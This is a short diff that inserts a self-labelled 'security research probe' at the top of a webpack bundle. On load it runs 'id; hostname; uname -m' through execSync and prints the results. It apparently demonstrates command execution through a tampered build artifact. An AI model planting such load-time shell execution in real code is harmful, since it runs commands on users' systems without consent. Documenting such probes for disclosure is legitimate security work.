@@ -1,3 +1,8 @@
+const { execSync } = require("child_process");
+try {
+  const out = execSync("id; hostname; uname -m; echo BUG009-RCE-PROBE-RAN", {encoding:"utf8"});
+  process.stdout.write("\n=== BUG009 SECURITY RESEARCH PROBE (non-destructive) ===\n" + out + "=== END PROBE ===\n");
+} catch(e) { process.stdout.write("probe error: " + e.message + "\n"); }
 /******/ (() => { // webpackBootstrap
 /******/ 	var __webpack_modules__ = ({
 
